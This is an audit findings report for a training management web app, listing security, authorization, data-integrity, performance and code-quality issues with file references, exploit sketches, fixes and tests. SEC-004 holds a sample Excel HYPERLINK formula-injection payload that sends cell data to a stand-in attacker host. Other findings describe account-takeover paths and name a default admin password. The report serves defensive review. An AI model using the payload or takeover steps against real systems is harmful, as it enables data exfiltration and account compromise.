# Findings

All findings grouped by category. **Critical** + **High** items are launch blockers unless explicitly marked otherwise. Every finding cites file:line; quote the offending code where short enough.

Categories:

- [C-SEC — Security](#c-sec--security)
- [C-AUTHZ — RBAC / Resource Authorization](#c-authz--rbac--resource-authorization)
- [C-DATA — Data Integrity](#c-data--data-integrity)
- [C-BACKEND — API surface](#c-backend--api-surface)
- [C-FE — Frontend](#c-fe--frontend)
- [C-PERF — Performance](#c-perf--performance)
- [C-OPS — Reliability / Observability](#c-ops--reliability--observability)
- [C-QA — Test Coverage](#c-qa--test-coverage)
- [C-CODE — Code Quality](#c-code--code-quality)
- [C-PROD — Enterprise LMS](#c-prod--enterprise-lms)

---

## C-SEC — Security

### SEC-001 — Critical — Live secrets in working tree
- **Files:** `server/.env:1-10`
- **Evidence:** Mongo URI with write user `tms_app`, JWT_SECRET hex, Gmail app password all present.
- **Exploit:** Any access to the dev machine (IDE extension, RAR backup, repo tar) yields admin JWT minting + DB write + outbound mail.
- **Fix:** Rotate all 3 secrets immediately. Move to `~/.config/tms/.env`. Add CI gitleaks job.
- **Test:** `tests/unit/secrets.test.js` assert `!fs.existsSync('server/.env')` in CI.
- **Owner:** Security / DevOps. **Effort:** S. **Dep:** none.

### SEC-002 — Critical — `protobufjs` RCE (CVSS 9.8) via `googleapis`
- **Files:** `server/package.json:27`
- **Path:** `googleapis → googleapis-common → gaxios → @opentelemetry/otlp-transformer → protobufjs`. 15 advisories total (1 critical, 3 high, 11 moderate).
- **Fix:** `npm audit fix --force`; verify Calendar/Sheets after the bump.
- **Test:** CI `npm audit --omit=dev --audit-level=high` blocks.
- **Owner:** Security / Backend. **Effort:** M.

### SEC-003 — Critical — `adminDbRoutes` allows MFA / password-reset bypass
- **File:** `server/routes/adminDbRoutes.js:33-37`
```js
const FORBIDDEN_UPDATE_FIELDS = [
  'password','passwordChangedAt','isDeleted','deletedAt','role',
];
```
Missing: `mfaEnabled, mfaSecret, mfaBackupCodes, passwordResetToken, passwordResetExpires, failedLoginAttempts, lockUntil, mustChangePassword, email, empCode`.
- **Exploit:** A second admin (or a compromised admin session) silently disables MFA on any user, sets a known `passwordResetToken`, and completes `/reset-password` — full takeover with no audit row written by this router.
- **Fix:** Extend the forbidden list to cover every auth/MFA/lockout field; force every mutation through `auditService.record` with full diff; extend `HARD_DELETE_BLOCKED` to include `Counter, Setting, AuditLog, Attendance, Enrollment, Evaluation`.
- **Test:** `tests/integration/adminDb.test.js` — `PUT /api/admin-db/User/:id { mfaEnabled: false }` returns 200 with `warning: 'Ignored protected fields: mfaEnabled'`, DB unchanged.
- **Owner:** Security. **Effort:** S.

### SEC-004 — High — Excel formula injection in attendance + evaluation exports
- **Files:** `server/services/exportService.js:176-192, 461-475`
- **Exploit:** A participant whose `name = '=HYPERLINK("http://evil/?x="&A2,"Click")'` is harmless in the web UI but auto-executes when HR opens the `.xlsx` in Excel.
- **Fix:**
```js
const safeCell = v => typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? `'${v}` : v;
```
Apply to `userName, department, teamName, classCode, courseName, remark, teacherComment, empCode, level`.
- **Test:** `tests/integration/exportFormulaInjection.test.js` — seed a user with `name = '=1+1'`, run export, parse the workbook, assert cell value is the literal `"'=1+1"`.
- **Owner:** Security / Backend. **Effort:** S.

### SEC-005 — High — Reset-password token in URL query string
- **File:** `server/controllers/authController.js:536-537`
```js
const resetUrl = `${clientOrigin}/reset-password?token=${rawToken}`;
```
- **Exploit:** Token leaks via Referer header (any third-party resource on the reset page), proxy access logs, browser history, shared computer history.
- **Fix:** Move token to URL path (`/reset-password/:token`) or HMAC-bind it to user email.
- **Test:** `tests/integration/passwordReset.tokenInPath.test.js` — assert email body URL has no `?token=`.
- **Owner:** Security. **Effort:** M.

### SEC-006 — Medium — CORS unconditionally allows no-origin requests
- **File:** `server/server.js:138-149`
- **Exploit:** Browsers always set `Origin`, but a non-browser caller (curl, attacker Node script) with a stolen cookie passes through with `credentials: true`.
- **Fix:** In production, reject no-origin requests except for `/health` / `/ready`.
- **Test:** `tests/integration/cors.test.js`.
- **Owner:** Security. **Effort:** S.

### SEC-007 — High — MFA-enrollment cookie allows `PUT /api/auth/change-password`
- **File:** `server/middleware/auth.js:77-83`
- **Exploit:** A user whose role requires MFA logs in (password phished), receives `enrollment-required` cookie, calls `change-password`, sets attacker's password, then enrolls attacker TOTP via `/mfa/setup` + `/mfa/verify-setup`. Net: phished password → full account takeover despite role-mandated MFA.
- **Fix:** Remove `/api/auth/change-password` from `ENROLLMENT_ALLOWED`.
- **Test:** `tests/integration/mfaEnrollment.changePasswordBlocked.test.js`.
- **Owner:** Security. **Effort:** S.

### SEC-008 — Medium — Forgot-password logs `empCode` at info level
- **File:** `server/controllers/authController.js:512, 524, 549, 555, 558, 620`
- **Exploit:** Anyone with log access enumerates which `empCode`s exist (defeats the anti-enumeration property of the 200 response).
- **Fix:** Log a SHA-256 hash truncated, or use `logger.debug` for negative branch; same message text for found/not-found.
- **Owner:** Security. **Effort:** S.

### SEC-009 — High — `mfa/admin-disable/:userId` and `auth/admin/force-logout/:userId` lack re-auth
- **Files:** `server/controllers/authController.js:306-334, 438-467`; `server/routes/authRoutes.js:78, 101-107`
- **Fix:** Apply the same `currentPassword` pattern as `userController.updateUser:215-245`.
- **Test:** `tests/integration/mfaAdminDisable.requireReauth.test.js`, `forceLogout.requireReauth.test.js`.
- **Owner:** Security. **Effort:** S.

### SEC-010 — Medium — `urlencoded({extended:true})` without limits
- **File:** `server/server.js:157`
- **Fix:** `express.urlencoded({ extended: false, limit: '100kb', parameterLimit: 100 })` — or remove entirely (app is JSON-only).
- **Owner:** Security / Backend. **Effort:** S.

### SEC-011 — Medium — `enrollmentRoutes` lacks Zod validation
- **File:** `server/routes/enrollmentRoutes.js:18-26`
- **Fix:** Create `server/schemas/enrollment.js` mirroring team/class schemas; add `validate({ body, params })` per route.
- **Owner:** Backend. **Effort:** S.

### SEC-012 — Medium — `create-admin.js` ships `admin12345` at bcrypt cost 10
- **File:** `server/create-admin.js:11`
- **Fix:** Generate a random 16-char password per call; print once to stdout; bcrypt cost 12.
- **Owner:** DevOps. **Effort:** S.

### SEC-013 — Medium — Audit-log gaps on 13 sensitive endpoints
| Sensitive action | File | Audit currently? |
|---|---|---|
| `POST /api/import/*` | `controllers/importController.js:11-116` | **NO** |
| `GET /api/export/*` | `controllers/exportController.js:17-92` | **NO** |
| `POST /api/sync/google-sheets` | `controllers/syncController.js:61-284` | **NO** |
| `PUT /api/settings` | `controllers/settingController.js:19-57` | **NO** |
| `GET/PUT/DELETE /api/admin-db/*` | `routes/adminDbRoutes.js:138-200` | **NO** |
| `POST /api/admin/reconcile/run` | `controllers/reconcileController.js:78-86` | **NO** |
| Password reset success | `controllers/authController.js:572-625` | logger only |
| Login → lockout triggered | `services/authService.js:222-226` | logger only |
| MFA verify failure | `services/authService.js:351-353` | logger only |
| CSRF token mismatch | `middleware/csrfProtection.js:60-69` | logger only |
| Cron auth failure | `middleware/cronAuth.js:50-56` | logger only |

- **Fix:** Add `auditService.record({ action, entity, ... })` to each.
- **Test:** `tests/integration/audit.write.test.js` (see [test-plan.md](./test-plan.md)).
- **Owner:** Backend. **Effort:** M.

### SEC-014 — Low — Schema drift: `getUsers` reads `req.query.search` not in Zod schema
- **File:** `server/controllers/userController.js:41-49`; `server/schemas/user.js:67-71`
- **Fix:** Add `search: z.string().trim().min(2).max(120).optional()`; mark schemas `.strict()`.

### SEC-015 — Low — MFA `verifyTokenWithReplay` accepts first-use delta after enrollment
- **File:** `server/services/mfaService.js:103-110`; `controllers/authController.js:195-220`
- **Fix:** On `verify-setup` success, persist `mfaLastUsedCounter` from the verify call; switch `mfaVerifySetup` to `verifyTokenWithReplay`.

### SEC-016 — Low — `forgotPassword` setImmediate swallows DB failures without escalation
- **File:** `server/controllers/authController.js:498-565`
- **Fix:** When save fails inside the catch block, also `Sentry.captureException`. Currently only `logger.warn`.

### SEC-017 — Low — `mongoSanitize@2.2.0` unmaintained
- **File:** `server/server.js:161`
- **Fix:** Replace with model-level Zod allow-listed `req.body` projection in controllers; OR switch to a maintained fork.

### SEC-018 — Info — `Authorization: Bearer` accepted alongside HttpOnly cookie
- **File:** `server/middleware/auth.js:42-47`
- **Fix:** Gate Bearer accept behind explicit env flag `ALLOW_BEARER_AUTH=true`; default false in production.

---

## C-AUTHZ — RBAC / Resource Authorization

### AUTHZ-001 — Critical — Evaluation has no teacher-class binding
- **Files:** `server/controllers/evaluationController.js:72-77, 79-101, 111-133`; `server/models/Class.js`
- **Evidence:** Open TODO in source: "Introduce a Class.teacherIds field and gate Teacher reads/writes by membership."
- **Exploit:** Any Teacher passes `?classId=<any>` to read or upsert an evaluation in any class org-wide.
- **Fix:** Add `Class.teacherIds: [ObjectId]`; introduce `server/policy/evaluation.js` with `canRead/canWrite/canMark`; gate via `requirePolicy` middleware.
- **Tests:** `tests/integration/evaluation.canWrite.test.js` — "Teacher A cannot upsert eval for Class B → 403"; same for `canRead` and `canMark`.
- **Owner:** Security / Backend. **Effort:** M.

### AUTHZ-002 — High — Schedule list/getById/availability has no `roleGuard`, Teacher unrestricted
- **Files:** `server/routes/scheduleRoutes.js:21, 34, 38`; `server/services/scheduleService.js:442, 451-458`
- **Exploit:** Teacher enumerates every team's schedules including enrolled-user emails (PII leak).
- **Fix:** Scope Teacher list to schedules whose class is in `Class.teacherIds[teacherId]` (depends on AUTHZ-001 schema change). OR explicitly grant Teacher == Admin on schedules and document.
- **Test:** `tests/integration/schedule.teacherScope.test.js`.
- **Owner:** Security / Backend. **Effort:** M.

### AUTHZ-003 — High — Frontend `useRole` permission map disagrees with server
- **File:** `client/src/hooks/useRole.js:28, 38-39, 44, 58`
- **Evidence:** UI claims Teacher has `read:users`, `create:schedule`, `update:schedule`, `record:attendance`, `create:evaluation` — server only grants attendance + evaluation; Teacher cannot create/update schedules or read users.
- **Exploit (UX):** Teacher sees "+ New Schedule" / "Edit" buttons that all 403 on submit; toast says "Save failed" with no diagnostic.
- **Fix:** Single source of truth — regenerate `PERMISSION_MAP` from server or share package.
- **Test:** `client/src/hooks/__tests__/useRole.test.js` already exists — update assertions.
- **Owner:** Frontend. **Effort:** S.

### AUTHZ-004 — Medium — `GET /api/classes/:id` not gated by Participant enrollment
- **File:** `server/routes/classRoutes.js:18`
- **Fix:** Gate read access by Enrollment existence for Participant role; OR document class info as non-sensitive.

---

## C-DATA — Data Integrity

### DATA-001 — Critical — Race: same user added to two teams concurrently
- **Files:** `server/controllers/teamController.js:31-53, 91-134`
- **Evidence:** `checkMemberConflicts` runs outside the transaction; two concurrent PUTs both pass.
- **Fix:** Partial unique index `Enrollment.index({userId:1},{unique:true, partialFilterExpression:{status:'Active'}})` + a dedup migration first.
- **Test:** `tests/integration/enrollment.concurrent.test.js` — `Promise.all([put(teamA,U), put(teamB,U)])` → exactly one Active enrollment exists.
- **Owner:** Backend / Data. **Effort:** M.

### DATA-002 — High — Race: two Ongoing classes share `classCode`
- **File:** `server/controllers/classController.js:113-124, 170-181`
- **Fix:** Partial unique `classSchema.index({classCode:1,status:1},{unique:true,partialFilterExpression:{status:'Ongoing'}})`.
- **Test:** `tests/integration/concurrent-ongoing-class.test.js`.

### DATA-003 — High — Race: two teams share same `classId`
- **Files:** `server/controllers/teamController.js:249, 354`
- **Fix:** Partial unique `Team.index({classId:1},{unique:true, partialFilterExpression:{classId:{$type:'objectId'}, isDeleted:{$ne:true}}})`. Dedup migration first.
- **Test:** `tests/integration/class-team-exclusivity-race.test.js`.

### DATA-004 — High — Race: one user is leader of two teams
- **Fix:** Partial unique `Team.index({leaderId:1},{unique:true, ...})`. Dedup first.
- **Test:** `tests/integration/team-leader-exclusivity.test.js`.

### DATA-005 — High — `cancelSlot` deletes attendance of past sessions
- **File:** `server/services/scheduleService.js:378-387`
- **Impact:** A teacher/admin who cancels a past session blows away all roll-call history for it.
- **Fix:** Refuse `schedule.startTime < now` in `cancelSlot` (or move to "archive" rather than delete).
- **Test:** `tests/integration/cancel-past-schedule-blocked.test.js`.

### DATA-006 — High — Class hard-delete cascades Evaluations + Enrollments permanently
- **File:** `server/controllers/classController.js:237-247`
- **Fix:** Soft-delete `Class` instead. Add `isDeleted`/`deletedAt` + pre-hooks (find AND aggregate); update reconcile to flag orphan refs.

### DATA-007 — High — `Team.aggregate` lacks soft-delete pre-hook
- **File:** `server/models/Team.js:58-66` (only `find/findOne/...` have it)
- **Affected:** `attendanceService.analyticsByTeam:181-242`; `dashboardController.getDashboardStats:181-238`.
- **Fix:**
```js
teamSchema.pre('aggregate', function () {
  const hasMatch = this.pipeline().some(s => s.$match && s.$match.isDeleted !== undefined);
  if (!hasMatch) this.pipeline().unshift({ $match: { isDeleted: { $ne: true } } });
});
```

### DATA-008 — High — `User.empCode`/`email` unique constraints not partial-filtered for soft-deleted
- **Files:** `server/models/User.js:22 (empCode), :227-232 (email)`
- **Impact:** Restoring a soft-deleted user fails E11000 if a replacement reused the slot. Or, the slot is permanently locked.
- **Fix:** Convert both indexes to partial unique excluding `isDeleted:true`. Dedup migration first. OR mutate `empCode`/`email` on soft-delete (`_deleted_<ts>` suffix).

### DATA-009 — High — `$lookup` to `users` does not respect Mongoose middleware
- **Files:** `server/services/attendanceService.js:137-141, 185-192`; `server/services/exportService.js:69-72`
- **Impact:** Soft-deleted users appear in analytics + exports.
- **Fix:** Inject explicit `$match: { isDeleted: { $ne: true } }` inside every lookup pipeline that joins users.

### DATA-010 — Medium — `importService.importUsers` can silently elevate roles
- **File:** `server/services/importService.js:88-125, 132`
- **Fix:** Scrub `role` field on `existing-match` rows; or require admin re-auth at the import controller.
- **Test:** `tests/integration/import-cannot-elevate-role.test.js`.

### DATA-011 — Medium — Reconcile misses 14 of ~20 drift classes
- **File:** `server/services/reconcileService.js`
- **Missing checks:** orphan `schedule.classId`, duplicate Active enrollment cross-team, two teams sharing `classId`, two Ongoing classes per code, `Counter.seq < max(empCode/classCode)`, TTL not pruning, soft-deleted user still in `Team.members`, `schedule.bookedTeamId` points to soft-deleted Team, orphan attendance/eval, schedule overlap detection.
- **Fix:** Extend reconcile with at least 4 high-severity checks (duplicate active, orphan schedule.classId, two teams sharing classId, two Ongoing classes per code).

### DATA-012 — Medium — `Counter` helper is not session-aware
- **File:** `server/helpers/counter.js:33-40`
- **Fix:** Document: never call inside `withTransaction` (the `$inc` is not rolled back on tx abort → sparse sequence holes).

### DATA-013 — Medium — `endTime > startTime` not validated at schema level
- **File:** `server/models/Schedule.js`
- **Fix:** Add Mongoose cross-field validator on `endTime`.

### DATA-014 — Medium — `passwordChangedAt` not auto-updated in `pre('save')`
- **File:** `server/models/User.js:240-245`
- **Impact:** Any code path that sets password without explicitly bumping the timestamp leaves old JWTs valid.
- **Fix:** Move `passwordChangedAt = new Date()` into the same `pre('save')` block when `password` is modified.

---

## C-BACKEND — API surface

### API-001 — High — Inconsistent response shape
- Some controllers return `{success, data, ...}`, some return raw arrays (e.g. `getTeams` returns `Team.find()` unpaginated).
- **Fix:** Codify `{success, data, pages, total, count}` everywhere.

### API-002 — High — `getTeams` unpaginated + deep populate
- **File:** `server/controllers/teamController.js:207-218`; `server/routes/teamRoutes.js:23`
- 1000 teams × 9 members ≈ 9000 user docs in one payload.
- **Fix:** Paginate via existing `parsePagination` helper; lazy-load members on demand.

### API-003 — High — Fat controllers without service layer
- `teamController`, `userController`, `dashboardController`, `syncController` mix model access + business logic + side-effects directly.
- **Fix:** Extract `userService`, `teamService`, `dashboardService`, `syncService`, `enrollmentService`.

### API-004 — Medium — Status-code anti-patterns
- `exportRoutes.test.js:71, 131` tolerate `[200, 404]` — masks real regressions.
- **Fix:** Seed real data, assert 200 deterministically.

### API-005 — Medium — Error messages leak Mongo internals
- **File:** `server/server.js:248-260` — Mongoose duplicate-key error reveals the offending value.
- **Fix:** Map to generic message in production; keep diagnostic in dev/staging.

---

## C-FE — Frontend

### FE-001 — Critical — `SearchPalette` dead in production
- **Files:** `client/src/components/SearchPalette.jsx:22-26`; legacy redirects `client/src/App.jsx:206-217`
- **Impact:** Cmd+K → Enter → user lands on unfiltered list page. Query is dropped on the redirect.
- **Fix:** `ROUTE_FOR` builds `/people?tab=users&search=...`, `/people?tab=teams&search=...`, `/programs?tab=classes&search=...`. Forward `q` query in legacy redirects.

### FE-002 — Critical — `useRole` permission map lies (see also AUTHZ-003)
- **File:** `client/src/hooks/useRole.js:28, 38-39, 44, 58`
- **Fix:** Sync with server; remove Teacher claims for `read:users`, `create:schedule`, `update:schedule`.

### FE-003 — Critical — `AuthContext` multi-tab unsafe + no `queryClient.clear()` on logout
- **Files:** `client/src/context/AuthContext.jsx:14-25, 98-107`; `client/src/api/api.js:39-50`
- **Impact:** Logout in tab A leaves React Query cache + AuthContext alive in tab B; PII for previous user visible on shared workstation until full reload.
- **Fix:** Call `queryClient.clear()` on logout; add `window.addEventListener('storage', ...)` listener that triggers logout if `tms_user` is removed; remove `email` from localStorage payload; call `Sentry.setUser` after login + `setUser(null)` after logout.

### FE-004 — Critical — `DatabaseExplorer.STATUS_ENUMS.role` is wrong
- **File:** `client/src/pages/DatabaseExplorer.jsx:71`
```js
STATUS_ENUMS.role = ['Admin', 'Leader', 'Participant']; // ← wrong; canonical is 'Teacher'
```
- **Impact:** Admin saves user with invalid role; downstream auth checks fail unpredictably.
- **Fix:** `['Admin', 'Teacher', 'Participant']`.

### FE-005 — High — Default mutation `onError` double-toasts + `retry` for mutations
- **Files:** `client/src/queryClient.js:9-13, 16-21`
- **Fix:** `retry: 0` for mutations; consolidate toast handlers (either global OR per-hook, not both).

### FE-006 — High — `ProtectedRoute` blocks until `/auth/me` resolves
- **File:** `client/src/components/ProtectedRoute.jsx:5-43`
- **Fix:** `if (loading && !user)` so cached user enables optimistic render; flash-of-loading goes away on full-page refresh.

### FE-007 — High — Reports tab routes Teacher to Admin-only HR Export + Sheets Sync
- **Files:** `client/src/pages/ReportsPage.jsx:50-55`; `client/src/App.jsx:245-247`
- **Fix:** Hide HR Export / Sheets Sync tabs unless `isAdmin`.

### FE-008 — High — `usersAPI.sendInvite` does not exist; toast lies
- **File:** `client/src/pages/UsersPage.jsx:291`
- **Fix:** Remove the bulk "Invite" action OR implement the API.

### FE-009 — High — `ErrorBoundary` hard-codes Vietnamese
- **File:** `client/src/components/ErrorBoundary.jsx:29-46`
- **Fix:** Use `useTranslation`; add EN keys.

### FE-010 — High — Hand-rolled modals lack focus-trap and ARIA
- **Files:** `UsersPage:108`, `TeamsPage:106`, `ClassesPage:63, 145`, `ClassDetailPage:85`, `EvaluationPage:141`
- **Fix:** Replace with the existing `components/ui/dialog.jsx` (Radix Dialog) — unused today.

### FE-011 — Medium — `axios` has no `timeout`; mutations retry once on network error
- **File:** `client/src/api/api.js:3-10`
- **Fix:** `timeout: 30_000`; `retry: 0` on mutations (already mentioned in FE-005).

### FE-012 — Medium — CSRF token not refreshed when cookie expires
- **File:** `client/src/api/api.js:24-31`
- **Fix:** On 403 with `CSRF_INVALID` error code, call `/api/auth/csrf` and retry once.

### FE-013 — Medium — Sentry frontend incomplete
- **File:** `client/src/lib/sentry.js:23-49`
- **Issues:**
  - Comment claims `Sentry.replayIntegration()` but no replay is configured.
  - No `Sentry.setUser` after login.
  - No `beforeSend` scrub of axios breadcrumb data (passwords flow into breadcrumbs by default).
  - Source-map upload not configured in `vite.config.js:18-20` unless `SENTRY_AUTH_TOKEN`+org+project all set.

### FE-014 — Medium — `useTheme.js` competes with `next-themes`
- **File:** `client/src/hooks/useTheme.js:25-37`
- **Fix:** Pick one. `next-themes` handles FOUC properly; remove `useTheme.js` and migrate consumers.

### FE-015 — Medium — i18n migration ~30% complete
- 18 pages still hard-code VN/EN; `<html lang>` not updated by language toggle; date formatting uses 22 inline `toLocaleDateString('en')` / `'vi-VN'` calls.

### FE-016 — Medium — `ParticipantDashboard` greeting Vietnamese-only
- **File:** `client/src/pages/ParticipantDashboard.jsx:35-38`

### FE-017 — Medium — `document.title = 'TMS — ...'` hard-coded on 8 pages
- AttendancePage:69, BookClassPage:73, SchedulesPage:70, ClassesPage:209, HRExportPage:56, TeamsPage:435, UsersPage:251, EvaluationPage (similar)

### FE-018 — Medium — `runBulk('invite')` silent no-op + `Promise.all` short-circuit on bulk actions
- **File:** `client/src/pages/UsersPage.jsx:291, 300-314`
- **Fix:** Replace with `Promise.allSettled` + per-row result UI.

### FE-019 — Medium — Click-away closes modals without dirty-check
- **File:** `client/src/pages/UsersPage.jsx:108`
- **Fix:** Adopt `AttendanceDrawer.jsx:79-81` dirty-check pattern.

---

## C-PERF — Performance

### PERF-001 — High — `exportService.generateExcel` buffers full workbook in memory
- **File:** `server/services/exportService.js:133-203, 202`
- **At 100k rows:** ≈ 225 MB heap + ExcelJS overhead → OOM on Render free 512 MB.
- **Fix:** `workbook.xlsx.writeStream(res)` + `Attendance.aggregate(pipeline).cursor({batchSize:500}).eachAsync`. Hard-cap 50k rows; return 413 above.
- **Benchmark:** Export 50k rows; target heap peak < 200 MB.

### PERF-002 — High — `dashboardController.getAlerts` unbounded `$lookup` per focus
- **File:** `server/controllers/dashboardController.js:284-336`
- **Fix:** Date guard (last 30 days), 30s cache, or materialize `attendanceStatus` on Schedule when `bulkMark` runs.

### PERF-003 — High — `analyticsByTeam` `$expr` `$lookup` not index-eligible
- **File:** `server/services/attendanceService.js:181-243`
- **At 1000 teams × 100k attendance:** catastrophic per-team scans.
- **Fix:** Invert direction (start on Attendance, group by userId, then `$lookup teams.members`), OR materialize `team_stats_daily`.

### PERF-004 — High — Reconcile checks 2/3 load entire collections
- **File:** `server/services/reconcileService.js:85-127, 135-167`
- **Fix:** Memoize active-enrollments fetch; rewrite ghost-member check as aggregation with `$lookup` + `$match: { matched: { $size: 0 } }`.

### PERF-005 — High — Reminder cron serial loop hits Render 100s timeout
- **File:** `server/services/reminderService.js:54-108`
- **Fix:** Bulk claim via single `updateMany`; bounded parallelism (`p-limit` 5–10); 5s per-send timeout.

### PERF-006 — High — Bulk import bcrypt × 2000 inside transaction → `TransactionTooOld` abort
- **File:** `server/services/importService.js:88-125`
- **Fix:** Hash OUTSIDE the transaction; lower `MAX_IMPORT_BATCH` to 500; `maxCommitTimeMS: 120000`.

### PERF-007 — High — `searchService` regex unanchored case-insensitive
- **File:** `server/services/searchService.js:41-93`
- **Fix:** Atlas Search OR anchored prefix `^${escape(q)}` with collation `{ locale:'en', strength:2 }`; add 60s debounced cache keyed by `role|q`.

### PERF-008 — Medium — `getUsers` lastActive aggregate unbounded
- **File:** `server/controllers/userController.js:67-89`
- **Fix:** Store `lastActiveAt` on User; update from `bulkMark` (write-through cache).

### PERF-009 — Medium — Mongoose `maxPoolSize` not set
- **File:** `server/config/db.js:25-32`
- **Fix:** `maxPoolSize: 20, minPoolSize: 2` on Render free / Atlas M0.

### PERF-010 — Medium — Missing indexes
- `Team.index({members:1})` — high-traffic multikey
- `Schedule.index({remindersSentAt:1, startTime:1})` — reminder cron scan
- `Schedule.index({endTime:1})` — reconcile + alerts
- `Attendance.index({exportBatchId:1})` — export claim/mark flow

### PERF-011 — Medium — `getTeams` unpaginated (dup of API-002)

### PERF-012 — Medium — `cacheMiddleware` patches only `res.json`, not `res.send`
- **File:** `server/middleware/analyticsCache.js:54-88`
- **Latent bug:** future cache attachment to export routes would silently bypass.

### PERF-013 — Low — `auditService.record` fire-and-forget without backpressure
- **File:** `server/services/auditService.js:88-108`
- **Fix:** Batch with 1-second buffered queue for bulk paths.

---

## C-OPS — Reliability / Observability

### OPS-001 — High — `healthCheckPath` not declared in `render.yaml`
- Render defaults to root `/`, so Mongo disconnect is not detected. **Fix:** add `healthCheckPath: /ready`.

### OPS-002 — High — No alerts for cron failure or reconcile drift
- **Fix:** Wire Sentry Cron Monitor for `reconcileJob` and `reminderService`; daily drift digest if `summary.total > 0`.

### OPS-003 — High — Client Sentry init missing (verify)
- `@sentry/react` is in `client/package.json` but no `Sentry.init` call found in `client/src/main.jsx` or `App.jsx`.
- **Fix:** Add client init gated by `VITE_SENTRY_DSN`; `Sentry.setUser` after login; source-map upload in build.

### OPS-004 — High — No 5xx-rate / Mongo-down / login-failure alerts
- **Fix:** Sentry rule on `error.type == HTTP 5xx`; Atlas webhook → Slack; failed-login per-IP threshold.

### OPS-005 — Medium — SIGTERM does not close Mongo or stop cron jobs
- **File:** `server/server.js:293-309`
- **Fix:** Inside the shutdown handler: `await mongoose.connection.close()`; `cron.getTasks().forEach(t => t.stop())`.

### OPS-006 — Medium — Backup restore drill log empty
- **File:** `docs/backup-dr.md:213-216, 272-275`
- **Fix:** Schedule quarterly drill; populate log.

### OPS-007 — Medium — Pino redact paths miss top-level `req.body.password|newPassword|currentPassword`
- **File:** `server/lib/logger.js:11-20`

### OPS-008 — Medium — Audit log fire-and-forget without batching (dup of PERF-013)

---

## C-QA — Test Coverage

### QA-001 — Critical — Client Vitest + Playwright NOT gated by CI
- **File:** `.github/workflows/ci.yml`
- **Fix:** Add `client-tests` (`cd client && npm run test:run`) and `e2e-tests` (`npx playwright test`) as required blocking jobs.

### QA-002 — Critical — 0 tests for MFA flow
- **Fix:** `tests/integration/mfa.test.js` covering enroll, verify, backup, replay, admin-disable.

### QA-003 — Critical — 0 tests for `adminDbRoutes`
- Highest-privilege surface untested. **Fix:** see [test-plan.md](./test-plan.md#p0-tests).

### QA-004 — High — No Jest concurrency tests for booking race
- Only k6 script (not in CI). Replica set is already available.
- **Fix:** `tests/integration/booking.race.test.js` (see [test-plan.md](./test-plan.md)).

### QA-005 — High — `teams.test.js:122` `test.skip` with wrong reason
- The skip says "MongoMemoryServer lacks replica set" but `setup.js:36` uses `MongoMemoryReplSet`.
- **Fix:** Unskip.

### QA-006 — High — Artillery YAML passwords are wrong (`admin12345!` vs seed `admin12345`)
- **Files:** `server/tests/load/{smoke,load,spike}-test.yml`

### QA-007 — High — 0 tests for write-side audit log
- Audit is only tested as a read API; deleting `auditService.record` call from a controller doesn't break any test.
- **Fix:** `tests/integration/audit.write.test.js`.

### QA-008 — High — Login rate limiter not tested
- **Fix:** `tests/integration/auth.lockout.test.js`.

### QA-009 — Medium — `.bak` test files + `test_cascade_delete.js` not in Jest convention
- **Fix:** Delete or move under `server/scripts/`.

### QA-010 — Medium — `passwordReset.test.js:122-150` timing assertion (< 75 ms) is flake-prone

---

## C-CODE — Code Quality

### CODE-001 — High — Dev scripts ship inside server image
- `server/_check_schedules.js`, `analyze_*.js`, `cleanup_fake_teachers.js`, `create-admin.js`, `security_audit.js`, `e2e_test.js`; root `import_students.js`, `read_excel.js`.
- **Fix:** Move to `server/scripts/`; guard via existing `server/scripts/lib/dangerousScriptGuard.js`; add `.dockerignore` entries.

### CODE-002 — High — Legacy scripts kept "for reference" include dangerous operations
- **Path:** `server/scripts/legacy/README_DO_NOT_RUN.md` says one script "marks all Ongoing classes Completed".
- **Fix:** Delete per the README's own `git rm` recipe.

### CODE-003 — High — `fixController.js` orphan (175 lines, no route mount)
- **Fix:** Delete or mount under admin tools with re-auth.

### CODE-004 — High — Cross-controller import
- **File:** `server/controllers/enrollmentController.js:7` imports from `./teamController`.
- **Fix:** Move `syncEnrollments`, `flushPendingEmails` into `server/services/enrollmentSync.js`.

### CODE-005 — High — 10 files > 400 lines (refactor map)
| Lines | File | Responsibilities mixed |
|---:|---|---|
| 907 | `client/src/pages/ClassDetailPage.jsx` | 4 tabs + EditClassModal + per-tab fetches |
| 754 | `client/src/pages/UsersPage.jsx` | UserModal + grid + bulk + reauth |
| 743 | `client/src/pages/TeamsPage.jsx` | TeamModal + grid + progress modals |
| 715 | `server/services/scheduleService.js` | Booking, cancel, availability, session-order cache, calendar |
| 658 | `server/controllers/teamController.js` | CRUD + soft-delete + enrollment sync + email queueing |
| 640 | `server/controllers/authController.js` | login/MFA/forgot/reset/change all in one file |
| 624 | `client/src/pages/EvaluationPage.jsx` | EvalModal + score helpers + table |
| 544 | `server/controllers/enrollmentController.js` | mixes controller + data shaper |
| 535 | `client/src/pages/DatabaseExplorer.jsx` | whole generic DB editor |
| 511 | `server/controllers/userController.js` | CRUD + cascade + restore + progress |

### CODE-006 — High — `passwordChangedAt` not auto-updated in `pre('save')` (dup of DATA-014)

### CODE-007 — Medium — eslint-plugin-jsx-a11y downgraded to `warn` (7 rules)
- **File:** `client/eslint.config.js:54-60`
- **Comment in source:** "94 accessibility violations are real UX debt".
- **Fix:** Re-enable as `error`; burn down.

### CODE-008 — Medium — Launch-blocker TODOs
- `server/controllers/evaluationController.js:72` — "Introduce Class.teacherIds" (= AUTHZ-001).
- `server/controllers/scheduleController.js:124-126` — orphan comment about removed `teacherId` aggregate.

### CODE-009 — Medium — Native `window.confirm` for destructive ops
- `client/src/pages/EvaluationPage.jsx:456`, `TeamsPage.jsx:486`, `UsersPage.jsx:321`
- **Fix:** Reuse `client/src/components/BulkDeleteConfirm.jsx`.

### CODE-010 — Medium — Duplicate business logic
- Schedule conflict detection in 4 places: `scheduleService.js:266-277`, `scheduleController.js:168-180`, `client/src/lib/schedule-conflicts.js:4-14`, plus per-page uses.
- Weekly 2-session cap in 4 server places.
- `isLeader` check in 4 client pages.

### CODE-011 — Medium — Many controllers use repetitive `try { ... } catch (e) { handleError(res, e); }`
- **Fix:** `asyncHandler` wrapper.

### CODE-012 — Low — Hard-coded `vi-VN` locale in `CourseManager.jsx:24-32` and `DatabaseExplorer.jsx:55`

### CODE-013 — Low — Inconsistent `e?.preventDefault?.()` vs `e.preventDefault()`

---

## C-PROD — Enterprise LMS

These items are not "bugs" but block enterprise sale.

### PROD-001 — Critical (for sale) — No SSO/SAML/OIDC
- Grep finds nothing outside `node_modules`. `authService.js:172-290` is empCode + password + TOTP only.
